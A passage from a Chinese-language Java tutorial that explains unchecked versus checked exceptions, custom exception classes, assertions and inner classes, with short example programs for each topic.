如果现在所有的程序执行上只要使用了throws定义的方法都必须要求开发者进行手工处理，所以为了代码编写，提供有一个灵活可以选择的异常处理父类“RuntimeException”，这个类的异常的子类可以不需要强制性处理。</p><p>​    <strong>RuntimeException和Exception的区别：</strong></p><p>​    <strong>RuntimeException是Exception的子类；RuntimeException异常可以不需要强制性处理，而Exception异常必须强制性处理；</strong></p><p>​    可以列举出几个常见的RuntimeException：</p><p>​    1、NumberFormatException。2、ClassCastException。3、NullPointerException等等</p><h5 id="自定义异常类"><a href="#自定义异常类" class="headerlink" title="自定义异常类"></a>自定义异常类</h5><p>​    在JDK中有大量的异常类型，但是在实际的开发中可能这些异常类型未必够使用，因为不可能所有的都只抛出Exception，这时就要考虑自定义异常类。对于自定义异常有两种方案：1、继承Exception。2、继承RuntimeException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义异常</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BombException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BombException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Food</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">(<span class="type">int</span> num)</span> <span class="keyword">throws</span> BombException&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BombException</span>(<span class="string">&quot;吃太多了，肚子爆了&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;正常开始吃不怕&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test49</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Food.eat(<span class="number">11</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (BombException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073635.jpg"                      alt="image-20220716024242310"                ></p><h5 id="assert断言"><a href="#assert断言" class="headerlink" title="assert断言"></a>assert断言</h5><p>​    从JDK1.4开始有断言的功能，确定代码执行到某行之后一定是所期待的结果。在实际的开发中，对于断言并不一定是准确的，可能会偏差，这种偏差不应该影响程序的正常执行。</p><p>范例：断言的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//assert断言</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test50</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="comment">//中间会经过许多的x变量的操作步骤</span></span><br><span class="line">        <span class="type">assert</span>  <span class="variable">x</span> <span class="operator">=</span>=<span class="number">100</span>:<span class="string">&quot;x的内容不是100&quot;</span>;</span><br><span class="line">        System.out.println(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073636.jpg"                      alt="image-20220716025106880"                ></p><p>​    我们在执行的的时候执行java -ea test.java就可以开启断言</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073638.jpg"                      alt="image-20220716025147177"                ></p><p>​    所以在Java里并没有将断言设置为一个程序必须执行的步骤，需要在特定的环境下才可以。</p><hr><h4 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4><p>​    虽然在类之中的基本组成就是成员属性与方法，但是在任何的语言里面结构也是允许嵌套的，所以在一个类的内部可以定义其他的类，这样的类就称为内部类。</p><h5 id="内部类基本概念"><a href="#内部类基本概念" class="headerlink" title="内部类基本概念"></a>内部类基本概念</h5><p>​    如果说到内部类肯定其本身是一个独立且完善的类结构，在一个类的内部出了属性和方法之外可以继续使用class定义内部的类。</p><p>范例：内部类的基本定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部类的基本概念</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();<span class="comment">//实例化内部类对象</span></span><br><span class="line">        in.print();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//在Outer类的内部定义了Inner类</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(Outer.<span class="built_in">this</span>.msg);<span class="comment">//输出Outer类中的属性</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test51</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();<span class="comment">//实例化外部类</span></span><br><span class="line">        out.fun();<span class="comment">//调用外部类中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    从整个的代码上实际上发现内部类的结构并不难理解，甚至可以说其结构与普通类一样清晰明了。</p><p>​    其实从整体的代码结构上来讲内部类的结构并不合理。所以内部类本身来讲最大的缺陷在于破坏了程序的结构，但是破坏需要有目的的破坏，那么它也一定会有其优势，如果想要更好地观察出内部类的优势，就可以将这个内部类拿到外面来。</p><p>范例：将以上程序分为两个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部类的基本概念</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="comment">//思考五：需要将当前对象Outer传递到Inner类之中</span></span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>(<span class="built_in">this</span>);<span class="comment">//实例化内部类对象</span></span><br><span class="line">        in.print();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//思考一：msg属性如果要被外部访问需要提供有getter方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Inner</span> &#123;<span class="comment">//在Outer类的内部定义了Inner类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//思考三：Inner这个类对象实例化的时候需要Outer类的引用</span></span><br><span class="line">    <span class="keyword">private</span> Outer out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//思考四：应该通过Inner类的构造方法获取Outer类对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Inner</span><span class="params">(Outer out)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.out = out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//思考二：如果要想调用外部类中的getter方法,一定需要outer类对象</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.out.getMsg());<span class="comment">//输出Outer类中的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test51</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();<span class="comment">//实例化外部类</span></span><br><span class="line">        out.fun();<span class="comment">//调用外部类中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以发现，整体的目的就是为了让Inner这个内部类可以访问Outer这个类中的私有属性。如果不用内部类的时候整体代码非常的麻烦，所以可以得出内部类的优点：<strong>轻松的访问外部类的私有属性。</strong></p><h5 id="内部类的相关说明"><a href="#内部类的相关说明" class="headerlink" title="内部类的相关说明"></a>内部类的相关说明</h5><p>​    现在已经清楚的认识到了内部类的优势以及结构，那么随后需要对内部类进行一些相关的说明，现在所定义的内部类都属于普通的内部类的形式，普通的类内部往往会提供有属性和方法，内部类虽然可以轻松的访问外部类的私有成员和私有方法，同理，外部类也可以轻松的访问内部类中的私有成员或私有方法。</p><p>范例：外部类访问内部类中的私有属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外部类访问内部类中的私有属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer1</span> &#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();<span class="comment">//实例化内部类对象</span></span><br><span class="line">        in.print();</span><br><span class="line">        System.out.println(in.info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//在Outer类的内部定义了Inner类</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;今天天气不好收衣服！&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(Outer1.<span class="built_in">this</span>.msg);<span class="comment">//输出Outer类中的属性</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test52</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer1</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer1</span>();<span class="comment">//实例化外部类</span></span><br><span class="line">        out.fun();<span class="comment">//调用外部类中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073639.jpg"                      alt="image-20220717004227186"                ></p><p>​    使用了内部类之后，内部类和外部类之间的私有操作的访问就不再需要通过setter、getter的方式间接完成了，可以通过内部类直接进行处理操作。</p><p>​    但是需要注意的是，内部类本身也属于一个类，虽然在大部分的情况下内部类往往是被外部类包裹的，但是外部依然可以产生内部类的实例化对象，而此时内部类实例化对象的格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外部类.内部类 内部类对象 = <span class="keyword">new</span> 外部类().new 内部类();</span><br></pre></td></tr></table></figure><p>​    在内部类编译完成后会自动形成一个“Outer$Inner.class”类文件，其中“$”这个符号换到程序之中就变为了“.”所以内部类的全称就是“外部类.内部类”。内部类与外部类之间可以直接进行私有成员的访问，这样一来内部类如果要是提供有实例化对象，一定要保证外部类要先实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外部类访问内部类中的私有属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer1</span> &#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//在Outer类的内部定义了Inner类</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;今天天气不好收衣服！&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(Outer1.<span class="built_in">this</span>.msg);<span class="comment">//输出Outer类中的属性</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test52</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer1.<span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer1</span>().<span class="keyword">new</span> <span class="title class_">Inner</span>();<span class="comment">//实例化外部类</span></span><br><span class="line">        in.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果此时Inner类只允许Outer类来使用，那么在这样的情况下就可以使用private进行私有定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外部类访问内部类中的私有属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer1</span> &#123;<span class="comment">//外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//在Outer类的内部定义了Inner类</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;今天天气不好收衣服！&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(Outer1.<span class="built_in">this</span>.msg);<span class="comment">//输出Outer类中的属性</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test52</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer1.<span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer1</span>().<span class="keyword">new</span> <span class="title class_">Inner</span>();<span class="comment">//实例化外部类</span></span><br><span class="line">        in.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73642.jpg"                      alt="image-20220717010122694"                ></p><p>​    此时的Inner类无法在外部进行使用。</p><p>​    在Java中类作为最基础的结构体实际上还有与之类似的抽象类或者是接口，抽象类与接口中都可以定义内部结构。</p><p>范例：定义内部接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义内部接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(IMessage5 msg)</span>;<span class="comment">//发送消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">interface</span> <span class="title class_">IMessage5</span> &#123;<span class="comment">//内部接口</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span>;<span class="comment">//获取消息内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelImpl</span> <span class="keyword">implements</span> <span class="title class_">IChannel2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(IMessage5 msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发送消息：&quot;</span>+msg.getContent());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test53</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IChannel2</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChannelImpl</span>();</span><br><span class="line">        channel.send(((ChannelImpl)channel).<span class="keyword">new</span> <span class="title class_">MessageImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    下面继续观察一个内部的抽象类，内部抽象类可以定义在普通类、抽象类、接口内部。</p><p>范例：观察内部抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//观察内部抽象类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>;<span class="comment">//发送消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMessage</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getContent</span><span class="params">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelImpl1</span> <span class="keyword">implements</span> <span class="title class_">IChannel3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">AbstractMessage</span> <span class="variable">msg1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl1</span>();</span><br><span class="line">        System.out.println(msg1.getContent());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MessageImpl1</span> <span class="keyword">extends</span> <span class="title class_">AbstractMessage</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test54</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IChannel3</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChannelImpl1</span>();</span><br><span class="line">        channel.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    内部类还有一些有意思的结构，即：如果现在定义了一个接口，那么可以在内部利用类实现该接口。在JDK1.8后，接口中追加了static方法可以不受到实例化对象的控制，现在就可以利用此特性来完成功能。</p><p>范例：接口内部进行接口实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 